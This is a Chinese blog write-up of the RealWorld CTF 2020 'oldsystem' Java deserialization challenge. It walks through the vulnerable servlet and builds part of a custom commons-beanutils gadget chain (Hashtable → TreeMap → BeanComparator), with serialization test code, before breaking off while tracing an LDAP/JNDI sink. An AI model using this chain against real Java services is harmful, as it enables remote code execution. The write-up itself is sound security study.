@@ -1,0 +1,535 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="小喇叭">
+  <meta name="keywords" content="">
+  <title>JAVA反序列化题目-RealWorld CTF 2020 oldsystem - 小喇叭</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>xiaolaba's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="JAVA反序列化题目-RealWorld CTF 2020 oldsystem">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-02-19 15:45" pubdate>
+        2021年2月19日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      34
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">JAVA反序列化题目-RealWorld CTF 2020 oldsystem</h1>
+            
+            <div class="markdown-body">
+              <h1 id="JAVA反序列化题目-RealWorld-CTF-2020-oldsystem"><a href="#JAVA反序列化题目-RealWorld-CTF-2020-oldsystem" class="headerlink" title="JAVA反序列化题目-RealWorld CTF 2020 oldsystem"></a>JAVA反序列化题目-RealWorld CTF 2020 oldsystem</h1><h2 id="审题"><a href="#审题" class="headerlink" title="审题"></a>审题</h2><p>1.题目的jdk版本是1.4</p>
+<p>存在的类和库</p>
+<p><img src="https://i.loli.net/2021/02/15/7wI9VdWTSnrxG6s.png" srcset="/img/loading.gif"></p>
+<p>看到<code>commons-collections</code>和<code>commons-beautils</code>就想到了反序列化</p>
+<p>看到<code>web.xml</code>，存在一个路由<code>/object</code></p>
+<p><img src="https://i.loli.net/2021/02/15/R3Yu5CmESP1986B.png" srcset="/img/loading.gif"></p>
+<p>看到<code>org.rwctf.ObjectServlet</code>，它继承了<code>HttpServlet</code>,在它的<code>init</code>方法中，定义了一个<code>appClassLoader</code>，限制了只能加载项目中的类，这里应该是让我们无法加载tomcat的全局依赖库（在上次的shiro反序列化中学到了tomcat和项目的依赖库是不一样的,jdk版本也是可以不一样的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(ServletConfig var1)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br>    <span class="hljs-keyword">super</span>.init(var1);<br>    String var2 = var1.getServletContext().getRealPath(<span class="hljs-string">&quot;/&quot;</span>);<br>    File var3 = <span class="hljs-keyword">new</span> File(var2 + File.separator + <span class="hljs-string">&quot;WEB-INF&quot;</span> + File.separator + File.separator + <span class="hljs-string">&quot;lib&quot;</span>);<br>    <span class="hljs-keyword">if</span> (var3.exists() &amp;&amp; var3.isDirectory()) &#123;<br>        File[] var4 = var3.listFiles();<br>        <span class="hljs-keyword">if</span> (var4 != <span class="hljs-keyword">null</span>) &#123;<br>            URL[] var5 = <span class="hljs-keyword">new</span> URL[var4.length + <span class="hljs-number">1</span>];<br><br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> var6 = <span class="hljs-number">0</span>; var6 &lt; var4.length; ++var6) &#123;<br>                <span class="hljs-keyword">if</span> (var4[var6].getName().endsWith(<span class="hljs-string">&quot;.jar&quot;</span>)) &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        var5[var6] = var4[var6].toURI().toURL();<br>                    &#125; <span class="hljs-keyword">catch</span> (MalformedURLException var9) &#123;<br>                        var9.printStackTrace();<br>                    &#125;<br>                &#125;<br>            &#125;<br><br>            File var10 = <span class="hljs-keyword">new</span> File(var2 + File.separator + <span class="hljs-string">&quot;WEB-INF&quot;</span> + File.separator + File.separator + <span class="hljs-string">&quot;classes&quot;</span>);<br>            <span class="hljs-keyword">if</span> (var10.exists() &amp;&amp; var10.isDirectory()) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    var5[var5.length - <span class="hljs-number">1</span>] = var10.toURI().toURL();<br>                &#125; <span class="hljs-keyword">catch</span> (MalformedURLException var8) &#123;<br>                    var8.printStackTrace();<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">this</span>.appClassLoader = <span class="hljs-keyword">new</span> URLClassLoader(var5);<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+<p>再看到他的<code>doPost</code>方法，可以很明显看到存在<code>readObject</code>，反序列化无疑了，但是看到他的<code>ObjectInputStream</code>是自己实现的，看看它有什么变化</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest var1, HttpServletResponse var2)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>    PrintWriter var3 = var2.getWriter();<br>    ClassLoader var4 = Thread.currentThread().getContextClassLoader();<br>    Thread.currentThread().setContextClassLoader(<span class="hljs-keyword">this</span>.appClassLoader);<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        ClassLoaderObjectInputStream var5 = <span class="hljs-keyword">new</span> ClassLoaderObjectInputStream(<span class="hljs-keyword">this</span>.appClassLoader, var1.getInputStream());<br>        Object var6 = var5.readObject();<br>        var5.close();<br>        var3.print(var6);<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var10) &#123;<br>        var10.printStackTrace(var3);<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        Thread.currentThread().setContextClassLoader(var4);<br>    &#125;<br></code></pre></td></tr></table></figure>
+<p><code>ClassLoaderObjectInputStream</code> 可以看到也没什么像添加黑名单，白名单的地方，只是定义了classLoader是上述规定的<code>URLClassLoader</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassLoaderObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ObjectInputStream</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ClassLoader classLoader;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ClassLoaderObjectInputStream</span><span class="hljs-params">(ClassLoader var1, InputStream var2)</span> <span class="hljs-keyword">throws</span> IOException, StreamCorruptedException </span>&#123;<br>        <span class="hljs-keyword">super</span>(var2);<br>        <span class="hljs-keyword">this</span>.classLoader = var1;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> Class <span class="hljs-title">resolveClass</span><span class="hljs-params">(ObjectStreamClass var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-keyword">return</span> Class.forName(var1.getName(), <span class="hljs-keyword">false</span>, <span class="hljs-keyword">this</span>.classLoader);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> Class <span class="hljs-title">resolveProxyClass</span><span class="hljs-params">(String[] var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        Class[] var2 = <span class="hljs-keyword">new</span> Class[var1.length];<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> var3 = <span class="hljs-number">0</span>; var3 &lt; var1.length; ++var3) &#123;<br>            var2[var3] = Class.forName(var1[var3], <span class="hljs-keyword">false</span>, <span class="hljs-keyword">this</span>.classLoader);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> Proxy.getProxyClass(<span class="hljs-keyword">this</span>.classLoader, var2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>因此这道题就是要我们利用题目给的库触发反序列化RCE，那么<code>commons-collections</code>和<code>commons-beautils</code>这两个库就应该是重点关注对象了，先看看<code>commons-collections</code></p>
+<p>版本是<code>2.1</code>，不满足<code>ysoserial</code>中的<code>3.1</code>和<code>4.0</code>，那要看看库里有没有形成反序列化漏洞的类</p>
+<p><img src="https://i.loli.net/2021/02/15/ghMQpozwCv6kDAR.png" srcset="/img/loading.gif"></p>
+<p>首先是各种的<code>transformer</code></p>
+<p>找到一个调用<code>tranform</code>方法的类，它有一个<code>Transformer</code>属性，看到接口类</p>
+<p><img src="https://i.loli.net/2021/02/15/x17dLikt3e5FYGg.png" srcset="/img/loading.gif"></p>
+<p>查找他的实现类，无果</p>
+<p><img src="https://i.loli.net/2021/02/15/1sfYIw7xTnrLBHS.png" srcset="/img/loading.gif"></p>
+<p><img src="https://i.loli.net/2021/02/15/ixwscTNP87ASvpe.png" srcset="/img/loading.gif"></p>
+<p>那么<code>commons-collections</code>的链就相当于断了（起码根据ysoserial的gadget来说，但也说不定还有没挖出来的gadget</p>
+<p>把目光放在<code>commons-beautils</code>,版本是<code>1.6</code>，也比<code>ysoserial</code>中的<code>1.9</code>要低</p>
+<p><img src="https://i.loli.net/2021/02/15/ui9efBQqMZGIUXt.png" srcset="/img/loading.gif"></p>
+<p>但是一眼就看到了gadget里需要用到的一个类，这就是一个好的开始（x</p>
+<p><img src="https://i.loli.net/2021/02/15/4EMxkGdLna6cA5O.png" srcset="/img/loading.gif"></p>
+<p>两个版本中<code>BeanComparator#compare</code>的区别只是1.9中多了几个报错的类型，因此它应该也可以获取某个类的无参get方法，然后形成进一步的利用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">    #####1.9<br>	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">( T o1, T o2 )</span> </span>&#123;<br><br>        <span class="hljs-keyword">if</span> ( property == <span class="hljs-keyword">null</span> ) &#123;<br>            <span class="hljs-comment">// compare the actual objects</span><br>            <span class="hljs-keyword">return</span> internalCompare( o1, o2 );<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            Object value1 = PropertyUtils.getProperty( o1, property );<br>            Object value2 = PropertyUtils.getProperty( o2, property );<br>            <span class="hljs-keyword">return</span> internalCompare( value1, value2 );<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( IllegalAccessException iae ) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException( <span class="hljs-string">&quot;IllegalAccessException: &quot;</span> + iae.toString() );<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( InvocationTargetException ite ) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException( <span class="hljs-string">&quot;InvocationTargetException: &quot;</span> + ite.toString() );<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( NoSuchMethodException nsme ) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException( <span class="hljs-string">&quot;NoSuchMethodException: &quot;</span> + nsme.toString() );<br>        &#125;<br>    &#125;<br>#####1.6<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(Object o1, Object o2)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Object value1 = PropertyUtils.getProperty(o1, <span class="hljs-keyword">this</span>.property);<br>            Object value2 = PropertyUtils.getProperty(o2, <span class="hljs-keyword">this</span>.property);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.comparator.compare(value1, value2);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var5) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ClassCastException(var5.toString());<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure>
+
+
+<p>但是不幸的是，jdk1.4中既不存在<code>PriorityQueue</code>也不存在<code>TemplatesImpl</code>,导致无法直接用<code>ysoserial</code>的gadget</p>
+<p>那么这道题的考点就是 自己挖出一条gadget出来</p>
+<p>而现在有了中间的一个点，需要找到反序列化的入口和反序列化的触发点</p>
+<h3 id="前半条链"><a href="#前半条链" class="headerlink" title="前半条链"></a>前半条链</h3><p>按照<code>ysoserial</code>的思路，我们需要找到一个队列，它在反序列化时会对队列中的属性进行<code>compare</code>，而它的<code>comparator</code>又是可以指定的，如果能找到这样的代替品，就能找到反序列化的入口</p>
+<p>全局搜索<code> comparator.compare</code>，定位到<code>TreeMap</code>,首先它可以被反序列化，再在类中查找一下调用<code>compare</code>的地方，几乎每个方法都调用了<code>compare</code></p>
+<p><img src="https://i.loli.net/2021/02/15/wTtFulNBgihVEpm.png" srcset="/img/loading.gif"></p>
+<p>先看看<code>getEntry</code>,这里的<code>Entry </code>,是<code>TreeMap</code>中用来存数据的地方</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> Entry <span class="hljs-title">getEntry</span><span class="hljs-params">(Object key)</span> </span>&#123;<br>    Entry p = root;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">int</span> cmp = compare(key,p.key);<br>        <span class="hljs-keyword">if</span> (cmp == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> p;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cmp &lt; <span class="hljs-number">0</span>)<br>            p = p.left;<br>        <span class="hljs-keyword">else</span><br>            p = p.right;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>&#125;<br>    Entry(Object key, Object value, Entry parent) &#123; <br>        <span class="hljs-keyword">this</span>.key = key;<br>        <span class="hljs-keyword">this</span>.value = value;<br>        <span class="hljs-keyword">this</span>.parent = parent;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+
+<p>再看调用<code>getEntry</code>的地方，第一个是<code>containsKey</code>，在它的父类<code>AbstractMap</code>中看到了调用<code>containsKey</code>的方法,但是他要求<code>value的值为null</code></p>
+<p><code>AbstractMap#equals</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!(o <span class="hljs-keyword">instanceof</span> Map))<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>Map t = (Map) o;<br><span class="hljs-keyword">if</span> (t.size() != size())<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br><br>       <span class="hljs-keyword">try</span> &#123;<br>           Iterator i = entrySet().iterator();<br>           <span class="hljs-keyword">while</span> (i.hasNext()) &#123;<br>               Entry e = (Entry) i.next();<br>               Object key = e.getKey();<br>               Object value = e.getValue();<br>               <span class="hljs-keyword">if</span> (value == <span class="hljs-keyword">null</span>) &#123;<br>                   <span class="hljs-keyword">if</span> (!(t.get(key)==<span class="hljs-keyword">null</span> &amp;&amp; t.containsKey(key)))<br>                       <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>               &#125; <span class="hljs-keyword">else</span> &#123;<br>                   <span class="hljs-keyword">if</span> (!value.equals(t.get(key)))<br>                       <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>               &#125;<br>           &#125;<br></code></pre></td></tr></table></figure>
+
+
+<p>可是调试期间发现<code>get</code>也能触发<code>getEntry</code>,那就无所谓用哪个触发<code>getEntry</code>了</p>
+<p><img src="https://i.loli.net/2021/02/15/w7DG4KgkvpPmthe.png" srcset="/img/loading.gif"></p>
+<p>那么现在要找的是调用<code>equals</code>的地方</p>
+<p>在<code>map.java</code>中看到了有这些类，然后在<code>Hashtable</code>中的<code>readObject</code>我发现了可利用的地方</p>
+<p><img src="https://i.loli.net/2021/02/15/6R7su85ApNiSjqM.png" srcset="/img/loading.gif"></p>
+<p><code>Hashtable#readObject</code>，它调用了<code>put</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Read the number of elements and then all the key/value objects</span><br><span class="hljs-keyword">for</span> (; elements &gt; <span class="hljs-number">0</span>; elements--) &#123;<br>    Object key = s.readObject();<br>    Object value = s.readObject();<br>    put(key, value);  <span class="hljs-comment">// synch could be eliminated for performance</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+<p>而<code>put</code>中就调用了<code>equals</code></p>
+<p><img src="https://i.loli.net/2021/02/15/5ykHW7sNMIiROlx.png" srcset="/img/loading.gif"></p>
+<p>测试了一下，确实可以调用到<code>TreeMap#get</code></p>
+<p><img src="https://i.loli.net/2021/02/15/T2rZW6D4w5Cz3eB.png" srcset="/img/loading.gif"></p>
+<p>代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test2</span> </span>&#123;<br><br>	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, SecurityException, NoSuchFieldException, IllegalArgumentException, IllegalAccessException, IOException </span>&#123;<br>		BeanComparator comparator = <span class="hljs-keyword">new</span> BeanComparator(<span class="hljs-string">&quot;class&quot;</span>);<br>		TreeMap tree1 = <span class="hljs-keyword">new</span> TreeMap(comparator);<br>		tree1.put(TreeMap.class, <span class="hljs-keyword">null</span>);<br>		TreeMap tree2 = <span class="hljs-keyword">new</span> TreeMap(comparator);<br>		tree2.put(TreeMap.class, <span class="hljs-keyword">null</span>);<br>		Hashtable hm = <span class="hljs-keyword">new</span> Hashtable();<br>		hm.put(tree1, <span class="hljs-string">&quot;aaa&quot;</span>);<br>		hm.put(tree2, <span class="hljs-string">&quot;bbb&quot;</span>);<br>		FileOutputStream fos = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;output/treemap1.bin&quot;</span>);<br>		ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(fos);<br>		oos.writeObject(hm);<br>		FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;output/treemap1.bin&quot;</span>);<br>		ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(fis);<br>		Hashtable tr = (Hashtable)ois.readObject();<br>		System.out.println(tr);<br><br>	&#125;<br></code></pre></td></tr></table></figure>
+
+
+<p>那么前半条链就找出来了</p>
+<h3 id="后半条链"><a href="#后半条链" class="headerlink" title="后半条链"></a>后半条链</h3><p>这半段实在是找不出来，就记录一下writeup的思路吧</p>
+<p>找到的触发点是</p>
+<p><code>com.sun.jndi.ldap.LdapAttribute#getAttributeDefinition</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> DirContext <span class="hljs-title">getAttributeDefinition</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException </span>&#123;<br>    DirContext var1 = <span class="hljs-keyword">this</span>.getBaseCtx().getSchema(<span class="hljs-keyword">this</span>.rdn);<br>    <span class="hljs-keyword">return</span> (DirContext)var1.lookup(<span class="hljs-string">&quot;AttributeDefinition/&quot;</span> + <span class="hljs-keyword">this</span>.getID());<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+<p>它调用了<code>getBaseCtx</code>,用其来新建一个<code>InitialDirContext</code>,而且他的<code>java.naming.provider.url</code>可控，就相当于可以控制 JNDI 的连接地址</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> DirContext <span class="hljs-title">getBaseCtx</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.baseCtx == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.baseCtxEnv == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">this</span>.baseCtxEnv = <span class="hljs-keyword">new</span> Hashtable(<span class="hljs-number">3</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">this</span>.baseCtxEnv.put(<span class="hljs-string">&quot;java.naming.factory.initial&quot;</span>, 